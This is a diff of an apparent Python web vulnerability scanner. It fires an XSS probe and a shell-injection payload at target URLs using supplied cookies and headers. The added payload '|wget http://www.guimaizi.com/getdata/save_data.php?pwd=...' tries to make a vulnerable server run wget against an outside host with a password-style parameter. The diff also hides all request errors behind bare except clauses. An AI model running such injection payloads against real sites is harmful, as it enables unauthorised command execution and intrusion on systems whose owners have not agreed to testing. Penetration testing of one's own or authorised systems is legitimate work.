@@ -58,19 +58,25 @@ class test_vul:
         
     def attack_post(self,url,data):
         #print(url)
-        kv={'user_agent':self.data['useragent'],'cookie':self.data['cookie'],'referer': self.data['referer'],"Content-Type": "application/x-www-form-urlencoded"}
-        r = requests.post(url,data,headers=kv)
-        if 'xssguimaizi' in r.text:
-            print('#xss:%s---%s'%(url,data))
-            print(r.text)
+        try:
+            kv={'user_agent':self.data['useragent'],'cookie':self.data['cookie'],'referer': self.data['referer'],"Content-Type": "application/x-www-form-urlencoded"}
+            r = requests.post(url,data,headers=kv)
+            if 'xssguimaizi' in r.text:
+                print('#xss:%s---%s'%(url,data))
+                #print(r.text)
+        except:
+            pass
     def attack_get(self,url):
-        kv={'user_agent':self.data['useragent'],'cookie':self.data['cookie'],'referer': self.data['referer'],"Content-Type": "application/x-www-form-urlencoded"}
-        r = requests.get(url,headers=kv)
-        if 'xssguimaizi' in r.text:
-            print('#xss:'+url)
-            print(r.text)
+        try:
+            kv={'user_agent':self.data['useragent'],'cookie':self.data['cookie'],'referer': self.data['referer'],"Content-Type": "application/x-www-form-urlencoded"}
+            r = requests.get(url,headers=kv)
+            if 'xssguimaizi' in r.text:
+                print('#xss:'+url)
+        except:
+            pass
+            #print(r.text)
 if '__main__' == __name__:
-    payload=['<\'\"xssguimaizi>','|wget http://www.guimaizi.com/']
+    payload=['<\'\"xssguimaizi>','|wget http://www.guimaizi.com/getdata/save_data.php?pwd=k40seKJp']
     for i in payload:
         item=test_vul(i)
     #item.attack_post('http://192.168.0.136/test_vul.php?aasdas=dsadas&xss=aa&13dsada=dsa','post_vul=dasxsssda')
